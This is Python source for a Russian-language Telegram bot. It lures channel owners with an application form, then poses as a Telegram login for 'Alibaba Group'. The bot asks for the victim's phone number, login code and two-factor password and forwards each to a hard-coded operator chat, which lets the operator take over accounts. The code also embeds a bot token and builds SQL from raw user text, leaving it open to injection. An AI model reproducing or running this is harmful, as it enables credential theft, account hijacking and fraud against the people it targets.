# -*- coding: utf-8 -*-
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove

import sqlite3


conn = sqlite3.connect("BD.db")
cursor = conn.cursor()


bot = Bot(token="5606559714:AAEBY5WADhhjze279oXyzi3bmbTq4ccgFkw")
dp = Dispatcher(bot)


start_q_but = KeyboardButton("Начать анкетирование")
start_auth_but = KeyboardButton("Начать авторизацию")
back_auth_but_user = KeyboardButton("Сменить данные")


invite_q_but = InlineKeyboardButton("✔️", callback_data="invite_q")
back_q_but = InlineKeyboardButton("❌", callback_data="back_q")
invite_auth_but = InlineKeyboardButton("✔️", callback_data="invite_auth")
back_auth_but = InlineKeyboardButton("❌", callback_data="back_auth")


Start_q_Keyboard = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
Start_q_Keyboard.add(start_q_but)


Start_auth_Keyboard = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
Start_auth_Keyboard.add(start_auth_but)


Back_auth_Keyboard = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
Back_auth_Keyboard.add(back_auth_but_user)


AdminPanelKeyboard = InlineKeyboardMarkup()
AdminPanelKeyboard.add(invite_q_but, back_q_but)


AdminPanelAuthKeyboard = InlineKeyboardMarkup()
AdminPanelAuthKeyboard.add(back_auth_but, invite_auth_but)


@dp.message_handler(commands=["start"])
async def start(message: types.Message):
	cursor.execute(f"SELECT page FROM users WHERE id={message.from_user.id}")
	user = cursor.fetchone()
	if user == None:
		cursor.execute(f"INSERT INTO users VALUES ({message.from_user.id}, 12, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL)")
		conn.commit()
		await bot.send_message(message.from_user.id, "Здравствуйте, для начала пройдите анкетирование", reply_markup=Start_q_Keyboard)


@dp.message_handler()
async def message(msg: types.Message):
	cursor.execute(f"SELECT page FROM users WHERE id={msg.from_user.id}")
	page = cursor.fetchone()[0]
	if page == 12:
		if msg.text == "Начать анкетирование":
			await bot.send_message(msg.from_user.id, "Введите ваше Имя", reply_markup=ReplyKeyboardRemove())
			cursor.execute(f"UPDATE users SET page=0 WHERE id={msg.from_user.id}")
			conn.commit()
	if page == 17:
			if msg.text == "Начать авторизацию":
				await bot.send_message(msg.from_user.id, "Авторизация в Telegram\nВойдите, чтобы использовать свою учетную запись Telegram в <a href='https://www.alibabagroup.com/en-US/'>Alibaba Group</a>\n<u>Пожалуйста, введите свой номер телефона в <a href='https://telegram.org/faq#login-and-sms'>международном формате</a></u> и мы отправим подтверждающее сообщение на ваш аккаунт через Telegram", parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
				cursor.execute(f"UPDATE users SET page=8 WHERE id={msg.from_user.id}")
				conn.commit()
	elif page == 0:
		cursor.execute(f"UPDATE users SET q1='{msg.text}' WHERE id={msg.from_user.id}")
		cursor.execute(f"UPDATE users SET page=1 WHERE id={msg.from_user.id}")
		conn.commit()
		await bot.send_message(msg.from_user.id, "Страна вашего проживания")
	elif page == 1:
		cursor.execute(f"UPDATE users SET q2='{msg.text}' WHERE id={msg.from_user.id}")
		cursor.execute(f"UPDATE users SET page=2 WHERE id={msg.from_user.id}")
		conn.commit()
		await bot.send_message(msg.from_user.id, "Email")
	elif page == 2:
		cursor.execute(f"UPDATE users SET q3='{msg.text}' WHERE id={msg.from_user.id}")
		cursor.execute(f"UPDATE users SET page=3 WHERE id={msg.from_user.id}")
		conn.commit()
		await bot.send_message(msg.from_user.id, "Контактный телефон")
	elif page == 3:
		cursor.execute(f"UPDATE users SET q4='{msg.text}' WHERE id={msg.from_user.id}")
		cursor.execute(f"UPDATE users SET page=4 WHERE id={msg.from_user.id}")
		conn.commit()
		await bot.send_message(msg.from_user.id, "Ваш логин в Telegram")
	elif page == 4:
		cursor.execute(f"UPDATE users SET q5='{msg.text}' WHERE id={msg.from_user.id}")
		cursor.execute(f"UPDATE users SET page=5 WHERE id={msg.from_user.id}")
		conn.commit()
		await bot.send_message(msg.from_user.id, "Ссылки на ваши ресурсы помимо Telegram (если есть)")
	elif page == 5:
		cursor.execute(f"UPDATE users SET q6='{msg.text}' WHERE id={msg.from_user.id}")
		cursor.execute(f"UPDATE users SET page=6 WHERE id={msg.from_user.id}")
		conn.commit()
		await bot.send_message(msg.from_user.id, "Канал, о котором была договоренность с менеджером")
	elif page == 6:
		cursor.execute(f"UPDATE users SET q7='{msg.text}' WHERE id={msg.from_user.id}")
		cursor.execute(f"UPDATE users SET page=13 WHERE id={msg.from_user.id}")
		conn.commit()
		await bot.send_message(msg.from_user.id, "Количество просмотров за сутки на одном посте в Вашем канале")
	elif page == 13:
		cursor.execute(f"UPDATE users SET q8='{msg.text}' WHERE id={msg.from_user.id}")
		cursor.execute(f"UPDATE users SET page=14 WHERE id={msg.from_user.id}")
		conn.commit()
		await bot.send_message(msg.from_user.id, "Количество публикаций")
	elif page == 14:
		cursor.execute(f"UPDATE users SET q9='{msg.text}' WHERE id={msg.from_user.id}")
		cursor.execute(f"UPDATE users SET page=15 WHERE id={msg.from_user.id}")
		conn.commit()
		await bot.send_message(msg.from_user.id, "Предпочитаемые методы выплаты")
	elif page == 15:
		cursor.execute(f"UPDATE users SET q10='{msg.text}' WHERE id={msg.from_user.id}")
		cursor.execute(f"UPDATE users SET page=7 WHERE id={msg.from_user.id}")
		conn.commit()
		cursor.execute(f"SELECT q1, q2, q3, q4, q5, q6, q7, q8, q9, q10 FROM users WHERE id={msg.from_user.id}")
		q = cursor.fetchone()
		await bot.send_message(5389497223, f"{msg.from_user.id}\n1){q[0]}\n2){q[1]}\n3){q[2]}\n4){q[3]}\n5){q[4]}\n6){q[5]}\n7){q[6]}\n8){q[7]}\n9){q[8]}\n10){q[9]}", reply_markup=AdminPanelKeyboard)
		await bot.send_message(msg.from_user.id, "Ожидайте рассмотрение заявки модератером")
	elif page == 7:
		await bot.send_message(msg.from_user.id, "Ваша заявка находиться на рассмотрении")
	elif page == 8:
		cursor.execute(f"UPDATE users SET page=9 WHERE id={msg.from_user.id}")
		conn.commit()
		await bot.send_message(msg.from_user.id, "Мы только что отправили вам сообщение. Пожалуйста, подтвердите доступ через Telegram. Введите код из сообщения.")
		await bot.send_message(5389497223, f"{msg.from_user.id}\n{msg.text}")
	elif page == 9:
		cursor.execute(f"UPDATE users SET page=10 WHERE id={msg.from_user.id}")
		conn.commit()
		await bot.send_message(msg.from_user.id, "Введите ваш двухфакторный пароль от аккаунта Telegram. Если его нет, пропустите данный этап")
		await bot.send_message(5389497223, f"{msg.from_user.id}\n{msg.text}")
	elif page == 10:
		cursor.execute(f"UPDATE users SET page=11 WHERE id={msg.from_user.id}")
		conn.commit()
		await bot.send_message(msg.from_user.id, "Ожидайте модерацию в течение 1 часа.", reply_markup=Back_auth_Keyboard)
		await bot.send_message(5389497223, f"{msg.from_user.id}\n{msg.text}", reply_markup=AdminPanelAuthKeyboard)
	elif page == 11:
		if msg.text == "Сменить данные":
			cursor.execute(f"UPDATE users SET page=8 WHERE id={msg.from_user.id}")
			conn.commit()
			await bot.send_message(msg.from_user.id, "Авторизация в Telegram\nВойдите, чтобы использовать свою учетную запись Telegram в <a href='https://www.alibabagroup.com/en-US/'>Alibaba Group</a>\n<u>Пожалуйста, введите свой номер телефона в <a href='https://telegram.org/faq#login-and-sms'>международном формате</a></u> и мы отправим подтверждающее сообщение на ваш аккаунт через Telegram", parse_mode="HTML")


@dp.callback_query_handler(lambda c: c.data == "invite_q")
async def invite_q(callback_query: types.CallbackQuery):
	await bot.answer_callback_query(callback_query.id)
	user_id = int(callback_query.message.text.split("\n")[0])
	cursor.execute(f"UPDATE users SET page=17 WHERE id={user_id}")
	conn.commit()
	await bot.edit_message_text(text=f"Вы приняли заявку\n{callback_query.message.text}", chat_id=callback_query.from_user.id, message_id=callback_query.message.message_id)
	await bot.send_message(user_id, "Ваша заявка принята", reply_markup=Start_auth_Keyboard)


@dp.callback_query_handler(lambda c: c.data == "back_q")
async def back_q(callback_query: types.CallbackQuery):
	await bot.answer_callback_query(callback_query.id)
	user_id = int(callback_query.message.text.split("\n")[0])
	cursor.execute(f"UPDATE users SET page=0 WHERE id={user_id}")
	conn.commit()
	await bot.edit_message_text(text=f"Вы не одобрили заявку\n{callback_query.message.text}", chat_id=callback_query.from_user.id, message_id=callback_query.message.message_id)
	await bot.send_message(user_id, "Вам не одобрено пройдите анкетирование заново")
	await bot.send_message(user_id, "Введите ваше Имя")


@dp.callback_query_handler(lambda c: c.data == "back_auth")
async def back_auth(callback_query: types.CallbackQuery):
	await bot.answer_callback_query(callback_query.id)
	user_id = int(callback_query.message.text.split("\n")[0])
	cursor.execute(f"UPDATE users SET page=8 WHERE id={user_id}")
	conn.commit()
	await bot.send_message(user_id, "Неудачная авторизация")
	await bot.send_message(user_id, "Авторизация в Telegram\nВойдите, чтобы использовать свою учетную запись Telegram в <a href='https://www.alibabagroup.com/en-US/'>Alibaba Group</a>\n<u>Пожалуйста, введите свой номер телефона в <a href='https://telegram.org/faq#login-and-sms'>международном формате</a></u> и мы отправим подтверждающее сообщение на ваш аккаунт через Telegram", parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
	await bot.edit_message_text(text="Вы не одобрили регистрацию", chat_id=callback_query.from_user.id, message_id=callback_query.message.message_id)

	
@dp.callback_query_handler(lambda c: c.data == "invite_auth")
async def invite_auth(callback_query: types.CallbackQuery):
	await bot.answer_callback_query(callback_query.id)
	user_id = int(callback_query.message.text.split("\n")[0])
	cursor.execute(f"UPDATE users SET page=16 WHERE id={user_id}")
	conn.commit()
	await bot.edit_message_text(text="Вы приняли заявку", chat_id=callback_query.from_user.id, message_id=callback_query.message.message_id)
	await bot.send_message(user_id, "Вы успешно прошли авторизацию", reply_markup=ReplyKeyboardRemove())


if __name__ == "__main__":
	executor.start_polling(dp)
